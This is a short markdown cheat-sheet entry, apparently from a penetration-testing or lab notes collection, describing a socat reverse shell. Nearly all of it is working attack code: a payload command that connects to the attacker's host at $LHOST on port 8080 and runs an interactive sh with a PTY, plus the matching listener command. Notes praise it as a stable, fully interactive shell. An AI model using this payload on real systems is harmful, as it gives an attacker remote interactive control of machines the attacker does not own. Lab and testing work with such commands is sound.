# Socat Reverse Shell

Using socat to spawn a reverse shell. This is a very stable shell.

Used on: **<Machine>**

## Payload

<!-- cmd: linux -->
```bash
socat tcp-connect:$LHOST:8080 exec:sh,pty,stderr,setsid,sigint,sane
```

## Listener

<!-- cmd: linux -->
```bash
socat file:`tty`,raw,echo=0 tcp-listen:8080
```

## Notes

- Requires socat to be installed on both target and attacker machines.
- Provides a fully interactive TTY shell out of the box.
